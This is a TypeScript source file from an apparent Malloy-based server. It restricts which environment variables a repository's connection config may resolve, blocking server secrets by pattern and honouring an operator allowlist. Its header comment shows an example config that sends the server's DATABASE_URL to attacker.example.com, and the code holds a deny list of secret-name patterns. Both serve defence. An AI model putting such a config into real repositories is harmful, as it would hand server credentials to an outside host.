// Copyright (c) The Malloy Foundation
// SPDX-License-Identifier: MIT

/**
 * WHICH ENVIRONMENT VARIABLES A MODEL'S CONFIG MAY READ.
 *
 * A repo's malloy-config.json names secrets as references, resolved against
 * this server's environment when a connection is looked up:
 *
 *   "password": {"env": "WAREHOUSE_PASSWORD"}
 *
 * Nothing in Malloy checks WHICH variable is named or WHERE the connection
 * goes, so a config that said
 *
 *   "host": "attacker.example.com", "password": {"env": "DATABASE_URL"}
 *
 * would hand this instance's metadata-database URL to whoever runs that host,
 * during the login handshake, before any query. The config is the repo's;
 * the environment is the server's. This overlay is the line between them.
 *
 * Two rules:
 *
 *  - The server's own secrets NEVER resolve, listed or not (`isServerSecret`).
 *    A warehouse credential lives under its own name. The one exception is
 *    `MOTHERDUCK_TOKEN`, which a config may name on purpose (see below).
 *  - `MALLOY_CONFIG_ENV` (comma-separated names, `PREFIX_*` patterns) is the
 *    operator's allowlist. Unset, everything else resolves, so existing repos
 *    keep working; set it to make the boundary explicit.
 *
 * An unresolved reference is not an error here: Malloy drops the property, so
 * the connection simply has no password — and fails to authenticate instead of
 * leaking.
 */

import { env as serverEnv } from "./env";

type Env = Record<string, string | undefined>;

/**
 * The one server credential a config MAY name: `{"env": "MOTHERDUCK_TOKEN"}`.
 *
 * It is the obvious name, and on many instances the server's MotherDuck
 * account is exactly the one the models are meant to use. src/lib/env.ts takes
 * the variable out of the process environment at load (so a token-less `md:`
 * connection cannot sign in as the server by accident), which is why the
 * overlay answers this name from the captured value rather than from the
 * environment: naming it is the explicit opt-in.
 */
const MOTHERDUCK_TOKEN = "MOTHERDUCK_TOKEN";

/**
 * The server's own credentials, which no model config may name.
 *
 * Patterns, not just today's names: a new provider's `AUTH_*_SECRET` or a
 * platform's `VERCEL_*` must be covered the day it appears. `DATABASE_*`,
 * `POSTGRES_*` and `PG*` are the metadata database — Vercel's Neon integration
 * sets all three families.
 */
const SERVER_SECRET_PATTERNS: readonly RegExp[] = [
  /^DATABASE_/,
  /^DATABASE$/,
  /^POSTGRES_/,
  /^PG[A-Z]/,
  /^AUTH_/,
  /^NEXTAUTH_/,
  /^OAUTH_/,
  /^GITHUB_/,
  /^ANTHROPIC_/,
  /^VERCEL/,
  /SECRET/,
  /^DASHBOARD_TOKEN/,
  /^MODEL_DEF_CACHE/,
];

export function isServerSecret(name: string): boolean {
  const upper = name.toUpperCase();
  return SERVER_SECRET_PATTERNS.some((p) => p.test(upper));
}

/** `MALLOY_CONFIG_ENV`, parsed: exact names, and `PREFIX_*` patterns. Null when unset. */
export function parseAllowlist(raw: string | undefined): { names: Set<string>; prefixes: string[] } | null {
  if (raw === undefined || raw.trim() === "") return null;
  const names = new Set<string>();
  const prefixes: string[] = [];
  for (const entry of raw.split(",").map((e) => e.trim()).filter(Boolean)) {
    if (entry.endsWith("*")) prefixes.push(entry.slice(0, -1));
    else names.add(entry);
  }
  return { names, prefixes };
}

/** Whether a config may read `name` from this server's environment. */
export function configMayRead(name: string, allowRaw: string | undefined): boolean {
  if (isServerSecret(name)) return false;
  const allow = parseAllowlist(allowRaw);
  if (!allow) return true;
  return allow.names.has(name) || allow.prefixes.some((p) => name.startsWith(p));
}

let warnedUnset = false;

/**
 * The `env` overlay this server hands Malloy in place of the default one
 * (which reads `process.env` for ANY name). Same shape: `(path) => value`,
 * `path[0]` the variable name.
 */
export function configEnvOverlay(
  env: Env = process.env,
  onRefused: (name: string) => void = () => {},
): (path: string[]) => string | undefined {
  const allowRaw = env.MALLOY_CONFIG_ENV;
  if (allowRaw === undefined && !warnedUnset) {
    warnedUnset = true;
    // Once per process. Not an error — it's the compatible default — but the
    // explicit list is the one that doesn't depend on SERVER_SECRET_PATTERNS
    // having anticipated every name.
    console.warn(
      "MALLOY_CONFIG_ENV is unset: model configs may read any environment variable except this " +
        "server's own secrets. Set it to the names they need (e.g. WAREHOUSE_*).",
    );
  }
  return (path: string[]) => {
    const name = path[0];
    if (typeof name !== "string" || name === "") return undefined;
    if (!configMayRead(name, allowRaw)) {
      onRefused(name);
      return undefined;
    }
    if (name === MOTHERDUCK_TOKEN) return env[name] ?? (serverEnv.MOTHERDUCK_TOKEN || undefined);
    return env[name];
  };
}
